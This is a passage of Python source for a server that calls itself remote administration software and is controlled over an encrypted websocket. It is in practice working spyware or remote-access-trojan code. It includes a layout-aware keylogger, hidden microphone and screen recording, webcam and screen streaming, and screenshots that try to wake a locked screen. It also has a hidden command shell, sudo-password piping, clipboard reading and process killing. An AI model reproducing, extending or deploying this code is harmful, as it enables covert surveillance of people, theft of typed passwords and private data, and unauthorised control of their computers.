"""
server.py — сервер удалённого администрирования.
"""

import argparse
import asyncio
import base64
import ctypes
import io
import json
import logging
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import urllib.error
import zipfile
from pathlib import Path

IS_WINDOWS = platform.system() == "Windows"

if IS_WINDOWS:
    import winreg

import websockets

HAS_MSS = False
try:
    import mss
    HAS_MSS = True
except ImportError:
    pass

HAS_CV2 = False
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    pass

HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    pass

HAS_KEYBOARD = False
try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    pass

HAS_PYNPUT = False
try:
    from pynput import keyboard as pynput_keyboard
    HAS_PYNPUT = True
except ImportError:
    pass

HAS_AUDIO = False
try:
    import sounddevice as sd
    import numpy as np
    HAS_AUDIO = True
except ImportError:
    pass

HAS_PSUTIL = False
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    pass

HAS_PYAUTOGUI = False
try:
    import pyautogui
    HAS_PYAUTOGUI = True
except ImportError:
    pass

from shared import CHUNK_SIZE, IS_WINDOWS, decrypt_msg, encrypt_msg, make_fernet, _subproc_flags

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()],
)
log = logging.getLogger("server")

SERVER_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE_PATH = os.path.join(SERVER_DIR, "server.log")


# ===================================================================
# Keylogger — uses foreground window's keyboard layout for correct chars
# ===================================================================
try:
    from pynput import keyboard as pynput_kbd
except Exception:
    pynput_kbd = None
    HAS_PYNPUT = False

if IS_WINDOWS:
    import ctypes.wintypes
    _GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
    _GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId
    _GetKeyboardLayout = ctypes.windll.user32.GetKeyboardLayout
    _GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
    _GetKeyboardState = ctypes.windll.user32.GetKeyboardState
    _ToUnicodeEx = ctypes.windll.user32.ToUnicodeEx

VK_MAP = {
    0x08: '[BS]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x10: None, 0x11: None,
    0x12: None, 0x14: '[CAPS]', 0x1B: '[ESC]', 0x20: '[SPACE]',
    0x21: '[PGUP]', 0x22: '[PGDN]', 0x23: '[END]', 0x24: '[HOME]',
    0x25: '[LEFT]', 0x26: '[UP]', 0x27: '[RIGHT]', 0x28: '[DOWN]',
    0x2D: '[INS]', 0x2E: '[DEL]',
    0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]', 0x73: '[F4]',
    0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]', 0x77: '[F8]',
    0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]',
}

class Keylogger:
    def __init__(self):
        self.running = False
        self._log = []
        self._lock = threading.Lock()
        self._listener = None
        if IS_WINDOWS:
            self._last_layout = 0
            self._layout_lock = threading.Lock()
            self._update_layout()
            self._layout_timer = None

    def _update_layout(self):
        if not IS_WINDOWS:
            return
        fg = _GetForegroundWindow()
        if fg:
            fg_tid = _GetWindowThreadProcessId(fg, None)
            if fg_tid:
                self._last_layout = _GetKeyboardLayout(fg_tid)
            else:
                self._last_layout = _GetKeyboardLayout(0)
        else:
            self._last_layout = _GetKeyboardLayout(0)

        if self.running:
            self._layout_timer = threading.Timer(0.1, self._update_layout)
            self._layout_timer.daemon = True
            self._layout_timer.start()

    def start(self):
        if self.running:
            return
        self.running = True
        self._log = []
        if HAS_PYNPUT and pynput_kbd:
            if IS_WINDOWS:
                self._update_layout()
            try:
                self._listener = pynput_kbd.Listener(on_press=self._on_key)
                self._listener.start()
            except Exception as e:
                log.warning(f"pynput keylog failed: {e}")
                self.running = False
        else:
            self.running = False

    def stop(self):
        self.running = False
        if IS_WINDOWS and self._layout_timer:
            self._layout_timer.cancel()
            self._layout_timer = None
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
            self._listener = None

    def get_log(self) -> str:
        with self._lock:
            text = "".join(self._log)
            self._log = []
        return text

    def _on_key(self, key):
        if IS_WINDOWS:
            self._on_key_win(key)
        else:
            self._on_key_linux(key)

    def _on_key_win(self, key):
        try:
            vk = key.vk
            if vk is None:
                if hasattr(key, 'name') and key.name:
                    if key.name == 'backspace':
                        self._remove_last()
                    elif key.name in ('enter', 'return'):
                        self._append('\n')
                    elif key.name == 'space':
                        self._append(' ')
                    elif key.name == 'tab':
                        self._append('\t')
                return

            if vk in (0x10, 0x11, 0x12, 0x5B, 0x5C):
                return

            if vk == 0x08:
                self._remove_last()
                return

            label = VK_MAP.get(vk)
            if label is not None:
                if label == '[SPACE]':
                    self._append(' ')
                else:
                    self._append(label)
                return

            with self._layout_lock:
                layout = self._last_layout if self._last_layout else _GetKeyboardLayout(0)

            kb_state = (ctypes.c_ubyte * 256)()
            _GetKeyboardState(kb_state)

            buf = ctypes.create_unicode_buffer(5)
            result = _ToUnicodeEx(vk, 0, kb_state, buf, 5, 0, layout)
            if result == 1:
                self._append(buf.value)
            elif hasattr(key, 'char') and key.char:
                self._append(key.char)
        except Exception:
            pass

    def _on_key_linux(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self._append(key.char)
            elif hasattr(key, 'name') and key.name:
                name = key.name
                if name == 'backspace':
                    self._remove_last()
                elif name in ('enter', 'return'):
                    self._append('\n')
                elif name == 'space':
                    self._append(' ')
                elif name == 'tab':
                    self._append('\t')
                else:
                    self._append(f'[{name.upper()}]')
        except Exception:
            pass

    def _append(self, text: str):
        with self._lock:
            self._log.append(text)
            total = sum(len(s) for s in self._log)
            if total > 1024 * 500:
                self._log = self._log[-1000:]

    def _remove_last(self):
        with self._lock:
            if not self._log:
                return
            last = self._log[-1]
            if last.startswith('['):
                self._log.pop()
            elif len(last) > 1:
                self._log[-1] = last[:-1]
            else:
                self._log.pop()


# ===================================================================
# Audio Recorder
# ===================================================================
class AudioRecorder:
    def __init__(self):
        self.is_recording = False
        self._recordings_dir = os.path.join(SERVER_DIR, "recordings")
        os.makedirs(self._recordings_dir, exist_ok=True)

    def start(self, duration=None):
        if not HAS_AUDIO:
            return False, "sounddevice + numpy not installed"
        if self.is_recording:
            return False, "Already recording"
        self.is_recording = True
        def _record():
            fs = 44100
            channels = 1
            dtype = np.int16
            chunk_secs = 60
            num = 1
            if duration:
                while self.is_recording and num * chunk_secs <= duration:
                    data = sd.rec(int(chunk_secs * fs), samplerate=fs, channels=channels, dtype=dtype)
                    sd.wait()
                    if not self.is_recording:
                        break
                    self._write_wav(os.path.join(self._recordings_dir, f"rec_{time.strftime('%Y%m%d_%H%M%S')}_{num:03d}.wav"), data, fs, channels)
                    num += 1
            else:
                while self.is_recording:
                    data = sd.rec(int(chunk_secs * fs), samplerate=fs, channels=channels, dtype=dtype)
                    sd.wait()
                    if not self.is_recording:
                        break
                    self._write_wav(os.path.join(self._recordings_dir, f"rec_{time.strftime('%Y%m%d_%H%M%S')}_{num:03d}.wav"), data, fs, channels)
                    num += 1
        self._thread = threading.Thread(target=_record, daemon=True)
        self._thread.start()
        return True, "Recording started"

    def stop(self):
        self.is_recording = False
        return True, "Recording stopped"

    def list_recordings(self):
        if not os.path.exists(self._recordings_dir):
            return []
        result = []
        for f in sorted(os.listdir(self._recordings_dir)):
            if f.endswith(".wav"):
                p = os.path.join(self._recordings_dir, f)
                result.append({"name": f, "size": os.path.getsize(p)})
        return result

    def get_recording(self, name):
        path = os.path.join(self._recordings_dir, name)
        if not os.path.isfile(path):
            return None
        with open(path, "rb") as f:
            return f.read()

    def delete_recording(self, name):
        path = os.path.join(self._recordings_dir, name)
        if os.path.exists(path):
            os.remove(path)
            return True
        return False

    def delete_all(self):
        if os.path.exists(self._recordings_dir):
            for f in os.listdir(self._recordings_dir):
                if f.endswith(".wav"):
                    os.remove(os.path.join(self._recordings_dir, f))
        return True

    @staticmethod
    def _write_wav(path, data, fs, channels):
        import struct
        ns = len(data)
        with open(path, "wb") as f:
            f.write(b"RIFF")
            f.write(struct.pack("<I", 36 + ns * 2))
            f.write(b"WAVEfmt ")
            f.write(struct.pack("<IHHIIHH", 16, 1, channels, fs, fs * channels * 2, channels * 2, 16))
            f.write(b"data")
            f.write(struct.pack("<I", ns * 2))
            f.write(data.tobytes())


recorder = AudioRecorder()


class ScreenRecorder:
    def __init__(self):
        self.is_recording = False
        self._recordings_dir = os.path.join(SERVER_DIR, "screen_recordings")
        os.makedirs(self._recordings_dir, exist_ok=True)
        self._thread = None

    def start(self, fps=10, duration=None):
        if not HAS_MSS or not HAS_CV2:
            return False, "mss + opencv-python required"
        if self.is_recording:
            return False, "Already recording"
        self.is_recording = True
        self._thread = threading.Thread(
            target=self._record, args=(fps, duration), daemon=True)
        self._thread.start()
        return True, "Screen recording started"

    def stop(self):
        self.is_recording = False
        return True, "Recording stopped"

    def _record(self, fps, duration):
        try:
            codec = 'XVID'
            with mss.MSS() as sct:
                monitor = sct.monitors[0]
                w, h = monitor["width"], monitor["height"]
                fname = os.path.join(self._recordings_dir,
                                     f"screen_{time.strftime('%Y%m%d_%H%M%S')}.avi")
                fourcc = cv2.VideoWriter_fourcc(*codec)
                out = cv2.VideoWriter(fname, fourcc, fps, (w, h))
                interval = 1.0 / fps
                start = time.monotonic()
                while self.is_recording:
                    if duration and (time.monotonic() - start) >= duration:
                        break
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    import numpy as _np
                    frame = _np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                    out.write(frame)
                    elapsed = time.monotonic() - start
                    wait = interval - (time.monotonic() - start) % interval
                    if wait > 0:
                        time.sleep(wait)
                out.release()
                log.info("Screen recording saved: %s", fname)
        except Exception as e:
            log.error("Screen recording error: %s", e)
        finally:
            self.is_recording = False

    def list_recordings(self):
        result = []
        if not os.path.exists(self._recordings_dir):
            return result
        for f in sorted(os.listdir(self._recordings_dir)):
            if f.endswith((".avi", ".mp4")):
                p = os.path.join(self._recordings_dir, f)
                result.append({"name": f, "size": os.path.getsize(p)})
        return result

    def get_recording(self, name):
        path = os.path.join(self._recordings_dir, name)
        if not os.path.isfile(path):
            return None
        with open(path, "rb") as f:
            return f.read()

    def delete_recording(self, name):
        path = os.path.join(self._recordings_dir, name)
        if os.path.exists(path):
            os.remove(path)
            return True
        return False


screen_recorder = ScreenRecorder()


# ===================================================================
# Screenshot
# ===================================================================
def capture_screenshot(quality=80):
    if not HAS_MSS:
        return None, "mss not installed"
    if not HAS_PIL:
        return None, "Pillow not installed"
    try:
        with mss.MSS() as sct:
            monitor = sct.monitors[0]
            sct_img = sct.grab(monitor)

        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

        is_locked = _is_lock_screen(img)
        if is_locked:
            _try_unlock()

        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality, optimize=True)
        b64 = base64.b64encode(buf.getvalue()).decode()
        return {"image_b64": b64, "width": sct_img.width, "height": sct_img.height, "locked": is_locked}, None
    except Exception as e:
        log.exception("Screenshot error")
        return None, str(e)


def _is_lock_screen(img):
    if not IS_WINDOWS:
        return False
    try:
        pixels = list(img.getdata())
        sample = pixels[::max(1, len(pixels) // 500)]
        avg_r = sum(p[0] for p in sample) / len(sample)
        avg_g = sum(p[1] for p in sample) / len(sample)
        avg_b = sum(p[2] for p in sample) / len(sample)
        variance = (sum((p[0]-avg_r)**2 + (p[1]-avg_g)**2 + (p[2]-avg_b)**2 for p in sample) / len(sample))
        if variance < 500 and avg_r < 30 and avg_g < 30 and avg_b < 30:
            return True
        if variance < 200:
            return True
    except Exception:
        pass
    return False


def _try_unlock():
    if not HAS_PYAUTOGUI:
        return
    try:
        pyautogui.press('space')
        import time as _t
        _t.sleep(0.5)
        pyautogui.press('space')
    except Exception:
        pass


# ===================================================================
# Screen Stream (live monitor)
# ===================================================================
class ScreenStream:
    def __init__(self, ws, fernet, fps=5, quality=70):
        self.ws = ws
        self.fernet = fernet
        self.fps = fps
        self.quality = quality
        self.task = None
        self.running = False

    async def start(self):
        if not HAS_MSS or not HAS_PIL:
            err = "mss+Pillow needed for screen stream"
            log.warning(err)
            await self.ws.send(encrypt_msg(self.fernet, {
                "type": "error",
                "payload": {"message": err},
            }))
            return
        self.running = True
        self.task = asyncio.create_task(self._run())
        log.info("Screen stream started at %d fps", self.fps)

    async def stop(self):
        self.running = False
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
        log.info("Screen stream stopped")

    async def _run(self):
        interval = 1.0 / max(self.fps, 1)
        loop = asyncio.get_running_loop()
        try:
            with mss.MSS() as sct:
                monitor = sct.monitors[0]
                while self.running:
                    t0 = time.monotonic()
                    sct_img = await loop.run_in_executor(None, lambda: sct.grab(monitor))
                    img = await loop.run_in_executor(
                        None,
                        lambda: Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX"),
                    )
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                    b64 = base64.b64encode(buf.getvalue()).decode()
                    msg = {
                        "type": "screen_frame",
                        "payload": {
                            "frame_b64": b64,
                            "width": sct_img.width,
                            "height": sct_img.height,
                        },
                    }
                    await self.ws.send(encrypt_msg(self.fernet, msg))
                    elapsed = time.monotonic() - t0
                    if elapsed < interval:
                        await asyncio.sleep(interval - elapsed)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.exception("Screen stream error: %s", e)


# ===================================================================
# Camera
# ===================================================================
class CameraStream:
    def __init__(self, ws, fernet, camera_index=0, fps=10, quality=80):
        self.ws = ws
        self.fernet = fernet
        self.camera_index = camera_index
        self.fps = fps
        self.quality = quality
        self.task = None
        self.cap = None

    async def start(self):
        if not HAS_CV2:
            await self._send_error("opencv-python not installed")
            return
        loop = asyncio.get_running_loop()
        self.cap = await loop.run_in_executor(None, cv2.VideoCapture, self.camera_index)
        if not self.cap or not self.cap.isOpened():
            await self._send_error(f"Camera #{self.camera_index} unavailable")
            return
        self.task = asyncio.create_task(self._run())
        log.info("Camera #%d started at %d fps", self.camera_index, self.fps)

    async def stop(self):
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
        if self.cap:
            self.cap.release()
        log.info("Camera stopped")

    async def _run(self):
        interval = 1.0 / max(self.fps, 1)
        try:
            while True:
                t0 = time.monotonic()
                loop = asyncio.get_running_loop()
                ret, frame = await loop.run_in_executor(None, self.cap.read)
                if not ret:
                    await asyncio.sleep(0.1)
                    continue
                _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.quality])
                msg = {
                    "type": "stream_frame",
                    "payload": {"frame_b64": base64.b64encode(buf.tobytes()).decode()},
                }
                await self.ws.send(encrypt_msg(self.fernet, msg))
                elapsed = time.monotonic() - t0
                if elapsed < interval:
                    await asyncio.sleep(interval - elapsed)
        except asyncio.CancelledError:
            pass

    async def _send_error(self, msg_text):
        await self.ws.send(encrypt_msg(self.fernet, {
            "type": "error",
            "payload": {"message": msg_text},
        }))


# ===================================================================
# Command execution — UTF-8 with Russian encoding fallback
# ===================================================================
async def run_command(command, timeout=60, sudo_password=None):
    try:
        if IS_WINDOWS:
            full_cmd = f'cmd /c "chcp 65001 >nul & {command}"'
        else:
            if sudo_password and command.strip().startswith("sudo"):
                command = command.replace("sudo", "sudo -S", 1)
            full_cmd = command
        proc = await asyncio.create_subprocess_shell(
            full_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdin_data = None
        if sudo_password and not IS_WINDOWS:
            stdin_data = (sudo_password + "\n").encode("utf-8")
        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(input=stdin_data), timeout)
        except asyncio.TimeoutError:
            proc.kill()
            stdout, stderr = b"", b"Command timed out"
        if IS_WINDOWS:
            for enc in ("utf-8", "cp1251", "cp866"):
                try:
                    stdout_text = stdout.decode(enc, errors="strict").strip()
                    stderr_text = stderr.decode(enc, errors="strict").strip()
                    return {
                        "stdout": stdout_text,
                        "stderr": stderr_text,
                        "returncode": proc.returncode,
                    }
                except UnicodeDecodeError:
                    continue
        else:
            for enc in ("utf-8", "latin-1"):
                try:
                    stdout_text = stdout.decode(enc, errors="strict").strip()
                    stderr_text = stderr.decode(enc, errors="strict").strip()
                    return {
                        "stdout": stdout_text,
                        "stderr": stderr_text,
                        "returncode": proc.returncode,
                    }
                except UnicodeDecodeError:
                    continue
        return {
            "stdout": stdout.decode("utf-8", errors="replace").strip(),
            "stderr": stderr.decode("utf-8", errors="replace").strip(),
            "returncode": proc.returncode,
            "needs_sudo_password": bool(
                not IS_WINDOWS
                and b"[sudo]" in stderr
                and b"password" in stderr.lower()
                and not sudo_password
            ),
        }
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


async def _safe_send(ws, fernet, data):
    """Send encrypted message, silently fail if connection is closed."""
    try:
        await ws.send(encrypt_msg(fernet, data))
    except Exception:
        pass


# ===================================================================
# Shell
# ===================================================================
class ShellSession:
    def __init__(self, ws, fernet):
        self.ws = ws
        self.fernet = fernet
        self.proc = None
        self.reader_task = None

    async def open(self):
        shell_cmd = "cmd.exe" if IS_WINDOWS else os.environ.get("SHELL", "/bin/bash")
        flags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
        self.proc = await asyncio.create_subprocess_exec(
            shell_cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            creationflags=flags,
        )
        log.info("Shell opened (PID %d)", self.proc.pid)
        self.reader_task = asyncio.create_task(self._read_loop())

    async def write(self, data):
        if self.proc and self.proc.stdin and not self.proc.stdin.is_closing():
            newline = "\r\n" if IS_WINDOWS else "\n"
            self.proc.stdin.write(data.encode("utf-8") + newline.encode())
            await self.proc.stdin.drain()

    async def close(self):
        if self.reader_task:
            self.reader_task.cancel()
        if self.proc:
            try:
                self.proc.terminate()
                await asyncio.wait_for(self.proc.wait(), timeout=2)
            except Exception:
                self.proc.kill()
        log.info("Shell closed")

    async def _read_loop(self):
        try:
            if self.proc and self.proc.stdout:
                while True:
                    line = await self.proc.stdout.readline()
                    if not line:
                        break
                    enc_list = ("utf-8", "cp1251", "cp866") if IS_WINDOWS else ("utf-8", "latin-1")
                    for enc in enc_list:
                        try:
                            text = line.decode(enc, errors="strict")
                            break
                        except UnicodeDecodeError:
                            continue
                    else:
                        text = line.decode("utf-8", errors="replace")
                    msg = {
                        "type": "shell_output",
                        "payload": {"stdout": text, "stderr": ""},
                    }
                    await _safe_send(self.ws, self.fernet, msg)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error("Shell read error: %s", e)


# ===================================================================
# File transfer
# ===================================================================
class FileTransferTracker:
    def __init__(self):
        self.send_buffers: dict[str, list] = {}

    def resolve_path(self, remote_path):
        clean = os.path.basename(remote_path.replace("/", "\\").split("\\")[-1])
        return os.path.join(SERVER_DIR, clean)

    def accumulate(self, clean_path, data_b64, idx, total):
        if clean_path not in self.send_buffers:
            self.send_buffers[clean_path] = [None] * total
        self.send_buffers[clean_path][idx] = data_b64
        if all(c is not None for c in self.send_buffers[clean_path]):
            full_b64 = "".join(self.send_buffers[clean_path])
            del self.send_buffers[clean_path]
            return base64.b64decode(full_b64)
        return None


# ===================================================================
# Log management
# ===================================================================
LOG_VIEW_LINES = 200


async def handle_log_view(ws, fernet):
    if not os.path.isfile(LOG_FILE_PATH):
        await _safe_send(ws, fernet, {
            "type": "log_view_result",
            "payload": {"exists": False, "lines": [], "message": "Log file does not exist"},
        })
        return
    try:
        with open(LOG_FILE_PATH, "r", encoding="utf-8", errors="replace") as f:
            all_lines = f.readlines()
        recent = all_lines[-LOG_VIEW_LINES:] if len(all_lines) > LOG_VIEW_LINES else all_lines
        await _safe_send(ws, fernet, {
            "type": "log_view_result",
            "payload": {
                "exists": True,
                "total_lines": len(all_lines),
                "lines": "".join(recent),
                "message": "Showing last {} lines of {}".format(len(recent), LOG_FILE_PATH),
            },
        })
    except Exception as e:
        await _safe_send(ws, fernet, {
            "type": "log_view_result",
            "payload": {"exists": False, "lines": [], "message": str(e)},
        })


async def handle_log_download(ws, fernet):
    if not os.path.isfile(LOG_FILE_PATH):
        await _safe_send(ws, fernet, {
            "type": "log_download_result",
            "payload": {"exists": False, "message": "Log file does not exist"},
        })
        return
    try:
        with open(LOG_FILE_PATH, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode()
        total = max(1, -(-len(b64) // CHUNK_SIZE))
        fname = os.path.basename(LOG_FILE_PATH)
        for i in range(total):
            s = i * CHUNK_SIZE
            e = s + CHUNK_SIZE
            await _safe_send(ws, fernet, {
                "type": "log_download_chunk",
                "payload": {
                    "data_b64": b64[s:e],
                    "chunk_index": i,
                    "total_chunks": total,
                    "filename": fname,
                },
            })
        await _safe_send(ws, fernet, {
            "type": "log_download_result",
            "payload": {"exists": True, "message": "Download complete", "total_chunks": total, "filename": fname},
        })
        log.info("Log file sent: %s (%d chunks)", fname, total)
    except Exception as e:
        await _safe_send(ws, fernet, {
            "type": "log_download_result",
            "payload": {"exists": False, "message": str(e)},
        })


async def handle_log_delete(ws, fernet):
    try:
        if os.path.isfile(LOG_FILE_PATH):
            os.remove(LOG_FILE_PATH)
            await _safe_send(ws, fernet, {
                "type": "log_delete_result",
                "payload": {"success": True, "message": "Log file deleted"},
            })
        else:
            await _safe_send(ws, fernet, {
                "type": "log_delete_result",
                "payload": {"success": True, "message": "Log file already absent"},
            })
    except Exception as e:
        await _safe_send(ws, fernet, {
            "type": "log_delete_result",
            "payload": {"success": False, "message": str(e)},
        })


def get_process_list():
    if HAS_PSUTIL:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
            try:
                info = p.info
                procs.append({
                    "pid": info['pid'],
                    "name": info['name'] or "",
                    "cpu": round(info['cpu_percent'] or 0, 1),
                    "mem": round(info['memory_percent'] or 0, 1),
                    "status": info['status'] or "",
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        procs.sort(key=lambda x: x['mem'], reverse=True)
        return procs
    else:
        try:
            if IS_WINDOWS:
                result = subprocess.run(
                    ['tasklist', '/FO', 'CSV', '/NH'],
                    capture_output=True, text=True, timeout=10,
                    creationflags=_subproc_flags(),
                )
                procs = []
                for line in result.stdout.strip().splitlines():
                    parts = line.replace('"', '').split(',')
                    if len(parts) >= 2:
                        procs.append({
                            "pid": int(parts[1]) if parts[1].isdigit() else 0,
                            "name": parts[0],
                            "cpu": 0, "mem": 0, "status": "",
                        })
                return procs
            else:
                result = subprocess.run(
                    ['ps', 'aux', '--sort=-%mem'],
                    capture_output=True, text=True, timeout=10,
                )
                procs = []
                for line in result.stdout.strip().splitlines()[1:]:
                    parts = line.split(None, 10)
                    if len(parts) >= 11:
                        procs.append({
                            "pid": int(parts[1]) if parts[1].isdigit() else 0,
                            "name": parts[10][:60],
                            "cpu": float(parts[2]) if parts[2].replace('.', '').isdigit() else 0,
                            "mem": float(parts[3]) if parts[3].replace('.', '').isdigit() else 0,
                            "status": parts[7] if len(parts) > 7 else "",
                        })
                return procs[:200]
        except Exception:
            return []


def kill_process(pid=None, name=None):
    if HAS_PSUTIL:
        try:
            if pid:
                p = psutil.Process(int(pid))
                p.kill()
                return True, f"Killed PID {pid}"
            elif name:
                killed = 0
                for p in psutil.process_iter(['name']):
                    if p.info['name'] and p.info['name'].lower() == name.lower():
                        p.kill()
                        killed += 1
                return True, f"Killed {killed} processes named {name}"
        except psutil.NoSuchProcess:
            return False, f"Process not found"
        except psutil.AccessDenied:
            return False, "Access denied (need admin)"
        except Exception as e:
            return False, str(e)
    else:
        try:
            if pid:
                if IS_WINDOWS:
                    subprocess.run(['taskkill', '/PID', str(pid), '/F'],
                                   creationflags=_subproc_flags(), timeout=10)
                else:
                    subprocess.run(['kill', '-9', str(pid)], timeout=10)
                return True, f"Killed PID {pid}"
            elif name:
                if IS_WINDOWS:
                    subprocess.run(['taskkill', '/IM', name, '/F'],
                                   creationflags=_subproc_flags(), timeout=10)
                else:
                    subprocess.run(['pkill', '-9', name], timeout=10)
                return True, f"Killed {name}"
        except Exception as e:
            return False, str(e)
    return False, "No method available"


def get_sysinfo():
    info = {}
    if HAS_PSUTIL:
        info["cpu_percent"] = psutil.cpu_percent(interval=1)
        info["cpu_count"] = psutil.cpu_count()
        mem = psutil.virtual_memory()
        info["ram_total_gb"] = round(mem.total / (1024**3), 1)
        info["ram_used_gb"] = round(mem.used / (1024**3), 1)
        info["ram_percent"] = mem.percent
        disk = psutil.disk_usage('/')
        info["disk_total_gb"] = round(disk.total / (1024**3), 1)
        info["disk_used_gb"] = round(disk.used / (1024**3), 1)
        info["disk_percent"] = disk.percent
        info["boot_time"] = psutil.boot_time()
        info["hostname"] = platform.node()
        info["os"] = platform.platform()
        try:
            info["ip"] = psutil.net_if_addrs()
        except Exception:
            pass
    else:
        info["hostname"] = platform.node()
        info["os"] = platform.platform()
        info["cpu_count"] = os.cpu_count()
        try:
            if IS_WINDOWS:
                result = subprocess.run(
                    ['wmic', 'OS', 'get', 'FreePhysicalMemory,TotalVisibleMemorySize', '/format:value'],
                    capture_output=True, text=True, timeout=10,
                    creationflags=_subproc_flags(),
                )
                for line in result.stdout.strip().splitlines():
                    if '=' in line:
                        k, v = line.split('=', 1)
                        if k.strip() == 'TotalVisibleMemorySize':
                            info["ram_total_gb"] = round(int(v) / (1024**2), 1)
                        elif k.strip() == 'FreePhysicalMemory':
                            free = int(v) / (1024**2)
                            total = info.get("ram_total_gb", 0)
                            info["ram_used_gb"] = round(total - free, 1)
                            info["ram_percent"] = round((total - free) / total * 100, 1) if total else 0
            else:
                try:
                    with open('/proc/meminfo', 'r') as f:
                        mem_lines = f.readlines()
                    mem_data = {}
                    for line in mem_lines:
                        parts = line.split()
                        if len(parts) >= 2:
                            mem_data[parts[0].rstrip(':')] = int(parts[1])
                    total_kb = mem_data.get('MemTotal', 0)
                    available_kb = mem_data.get('MemAvailable', mem_data.get('MemFree', 0))
                    if total_kb:
                        info["ram_total_gb"] = round(total_kb / (1024**2), 1)
                        used_gb = (total_kb - available_kb) / (1024**2)
                        info["ram_used_gb"] = round(used_gb, 1)
                        info["ram_percent"] = round(used_gb / (total_kb / (1024**2)) * 100, 1)
                except Exception:
                    pass
                try:
                    result = subprocess.run(
                        ['df', '-B1', '/'],
                        capture_output=True, text=True, timeout=5,
                    )
                    lines = result.stdout.strip().splitlines()
                    if len(lines) >= 2:
                        parts = lines[1].split()
                        if len(parts) >= 6:
                            total = int(parts[1])
                            used = int(parts[2])
                            info["disk_total_gb"] = round(total / (1024**3), 1)
                            info["disk_used_gb"] = round(used / (1024**3), 1)
                            info["disk_percent"] = round(used / total * 100, 1) if total else 0
                except Exception:
                    pass
        except Exception:
            pass
    return info


def fs_list(path="."):
    if not os.path.isabs(path):
        path = os.path.abspath(path)
    if not os.path.isdir(path):
        return {"error": f"Not a directory: {path}"}
    entries = []
    try:
        for entry in os.scandir(path):
            try:
                stat = entry.stat()
                entries.append({
                    "name": entry.name,
                    "is_dir": entry.is_dir(),
                    "size": stat.st_size if not entry.is_dir() else 0,
                    "modified": stat.st_mtime,
                })
            except (PermissionError, OSError):
                entries.append({"name": entry.name, "is_dir": False, "size": 0, "modified": 0, "error": "access denied"})
    except PermissionError:
        return {"error": f"Permission denied: {path}"}
    except Exception as e:
        return {"error": str(e)}
    return {"path": path, "entries": entries}


def get_clipboard():
    try:
        if IS_WINDOWS:
            import subprocess as sp
            result = sp.run(
                ['powershell', '-Command', 'Get-Clipboard'],
                capture_output=True, text=True, timeout=5,
                creationflags=sp.CREATE_NO_WINDOW if IS_WINDOWS else 0,
            )
            return True, result.stdout
        else:
            import subprocess as sp
            for tool in (['xclip', '-selection', 'clipboard', '-o'],
                         ['xsel', '--clipboard', '--output'],
                         ['wl-paste']):
                try:
                    result = sp.run(tool, capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        return True, result.stdout
                except FileNotFoundError:
                    continue
            return False, "No clipboard tool (install xclip/xsel/wl-paste)"
    except Exception as e:
        return False, str(e)


def set_clipboard(text):
    try:
        if IS_WINDOWS:
            import subprocess as sp
            proc = sp.Popen(
                ['powershell', '-Command', 'Set-Clipboard', '-Value', text],
                stdin=sp.DEVNULL, stdout=sp.DEVNULL, stderr=sp.DEVNULL,
                creationflags=sp.CREATE_NO_WINDOW if IS_WINDOWS else 0,
            )
            proc.wait(timeout=5)
            return True, "Clipboard set"
        else:
            import subprocess as sp
            for tool_cmd in (['xclip', '-selection', 'clipboard'],
                             ['xsel', '--clipboard', '--input'],
                             ['wl-copy']):
                try:
                    proc = sp.Popen(tool_cmd, stdin=sp.PIPE, stdout=sp.DEVNULL, stderr=sp.DEVNULL)
                    proc.communicate(text.encode('utf-8'), timeout=5)
                    if proc.returncode == 0:
                        return True, "Clipboard set"
                except FileNotFoundError:
                    continue
            return False, "No clipboard tool (install xclip/xsel/wl-copy)"
    except Exception as e:
        return False, str(e)


def mouse_move(x, y, relative=False):
    if not HAS_PYAUTOGUI:
        return False, "pyautogui not installed"
    try:
        if relative:
            pyautogui.moveRel(x, y)
        else:
            pyautogui.moveTo(x, y)
        return True, f"Mouse moved to {x},{y}"
    except Exception as e:
        return False, str(e)


def mouse_click(x=None, y=None, button="left", clicks=1):
    if not HAS_PYAUTOGUI:
        return False, "pyautogui not installed"
